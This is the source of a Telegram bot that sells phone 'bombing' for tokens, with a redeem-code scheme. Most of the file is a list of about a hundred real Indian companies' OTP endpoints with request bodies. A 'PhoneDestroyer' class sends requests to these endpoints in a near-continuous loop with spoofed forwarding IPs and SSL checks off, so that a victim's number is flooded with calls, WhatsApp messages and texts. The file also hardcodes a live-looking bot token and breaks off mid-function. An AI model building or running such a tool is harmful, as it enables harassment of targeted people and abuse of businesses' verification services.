import asyncio
import aiohttp
import time
import random
import json
import os
import sqlite3
import threading
from datetime import datetime, timedelta
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import logging

# ============ CONFIG ============
BOT_TOKEN = "8460733171:AAEAu78JX77pIFyWRNOsRVZl7eS1IxrDQbw"
OWNER_ID = 8823804885
ADMIN_IDS = [8823804885]  # Multiple admins add kar sakte ho
CHANNEL_REQUIRED = "https://t.me/+C4Nq8BYJ4yliM2Y9"  # Default channel
FREE_TOKENS = 100
TOKEN_PRICE = 50  # ₹50 per 1000 tokens
SUPPORT_USERNAME = "@LuaFucker"

# ============ DATABASE SETUP ============
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('bomber.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Users table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            tokens INTEGER DEFAULT 0,
            total_used INTEGER DEFAULT 0,
            join_date TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )''')
        
        # Targets table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            added_by INTEGER,
            date TEXT,
            status TEXT DEFAULT 'pending'
        )''')
        
        # History table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            calls_sent INTEGER,
            whatsapp_sent INTEGER,
            sms_sent INTEGER,
            total_hits INTEGER,
            date TEXT
        )''')
        
        # Redeem codes table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            tokens INTEGER,
            created_by INTEGER,
            used_by INTEGER DEFAULT NULL,
            used_date TEXT DEFAULT NULL,
            expiry_date TEXT
        )''')
        
        # Channels table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            channel_username TEXT UNIQUE,
            added_by INTEGER,
            date TEXT
        )''')
        
        self.conn.commit()
        
        # Add default channel
        self.add_channel("@SepaxYtOfficial")
    
    def add_user(self, user_id, username, first_name):
        self.cursor.execute('''INSERT OR IGNORE INTO users 
            (user_id, username, first_name, tokens, join_date) 
            VALUES (?, ?, ?, ?, ?)''', 
            (user_id, username, first_name, FREE_TOKENS, datetime.now().isoformat()))
        self.conn.commit()
        return self.get_user(user_id)
    
    def get_user(self, user_id):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return self.cursor.fetchone()
    
    def update_tokens(self, user_id, tokens):
        self.cursor.execute('UPDATE users SET tokens = tokens + ? WHERE user_id = ?', (tokens, user_id))
        self.conn.commit()
    
    def add_history(self, user_id, phone, stats):
        self.cursor.execute('''INSERT INTO history 
            (user_id, phone, calls_sent, whatsapp_sent, sms_sent, total_hits, date)
            VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (user_id, phone, stats['calls_sent'], stats['whatsapp_sent'], 
             stats['sms_sent'], stats['successful_hits'], datetime.now().isoformat()))
        self.conn.commit()
    
    def generate_redeem_code(self, tokens, created_by):
        code = f"SEPAXYT{random.randint(100000, 999999)}"
        expiry = (datetime.now() + timedelta(days=30)).isoformat()
        self.cursor.execute('''INSERT INTO redeem_codes (code, tokens, created_by, expiry_date)
            VALUES (?, ?, ?, ?)''', (code, tokens, created_by, expiry))
        self.conn.commit()
        return code
    
    def redeem_code(self, code, user_id):
        self.cursor.execute('SELECT * FROM redeem_codes WHERE code = ? AND used_by IS NULL', (code,))
        data = self.cursor.fetchone()
        if data:
            self.cursor.execute('UPDATE redeem_codes SET used_by = ?, used_date = ? WHERE code = ?',
                (user_id, datetime.now().isoformat(), code))
            self.update_tokens(user_id, data[1])
            self.conn.commit()
            return data[1]
        return None
    
    def add_channel(self, channel):
        try:
            self.cursor.execute('INSERT OR IGNORE INTO channels (channel_username, added_by, date) VALUES (?, ?, ?)',
                (channel, OWNER_ID, datetime.now().isoformat()))
            self.conn.commit()
            return True
        except:
            return False
    
    def get_channels(self):
        self.cursor.execute('SELECT channel_username FROM channels')
        return [row[0] for row in self.cursor.fetchall()]
    
    def add_target(self, phone, added_by):
        self.cursor.execute('INSERT INTO targets (phone, added_by, date) VALUES (?, ?, ?)',
            (phone, added_by, datetime.now().isoformat()))
        self.conn.commit()
    
    def get_targets(self):
        self.cursor.execute('SELECT phone FROM targets WHERE status = "pending"')
        return [row[0] for row in self.cursor.fetchall()]
    
    def close(self):
        self.conn.close()

db = Database()

# ============ ULTIMATE APIS ============
ULTIMATE_APIS = [
    # CALL BOMBING APIS (50+)
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # WHATSAPP BOMBING APIS
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    # SMS BOMBING APIS (300+)  
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Vyapar",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
    },
    {
        "name": "MyGov",
        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "AstroSage",
        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "TooToo",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    }
]

# ============ PHONE DESTROYER CLASS ============
class PhoneDestroyer:
    def __init__(self):
        self.running = False
        self.current_phone = None
        self.stats = {
            "total_requests": 0,
            "successful_hits": 0,
            "failed_attempts": 0,
            "calls_sent": 0,
            "whatsapp_sent": 0,
            "sms_sent": 0,
            "start_time": 0,
            "active_apis": len(ULTIMATE_APIS)
        }
        self.user_id = None
    
    async def bomb_phone(self, session, api, phone):
        while self.running:
            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Client-IP"] = headers["X-Forwarded-For"]
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36"
                ])
                
                self.stats["total_requests"] += 1
                
                if "call" in name.lower() or "voice" in name.lower():
                    self.stats["calls_sent"] += 1
                    emoji = "📞"
                elif "whatsapp" in name.lower():
                    self.stats["whatsapp_sent"] += 1
                    emoji = "📱"
                else:
                    self.stats["sms_sent"] += 1
                    emoji = "💬"
                
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            self.stats["successful_hits"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            self.stats["successful_hits"] += 1
                
                await asyncio.sleep(0.001)
                
            except:
                self.stats["failed_attempts"] += 1
                continue
    
    async def start_destruction(self, phone, user_id):
        self.running = True
        self.current_phone = phone
        self.user_id = user_id
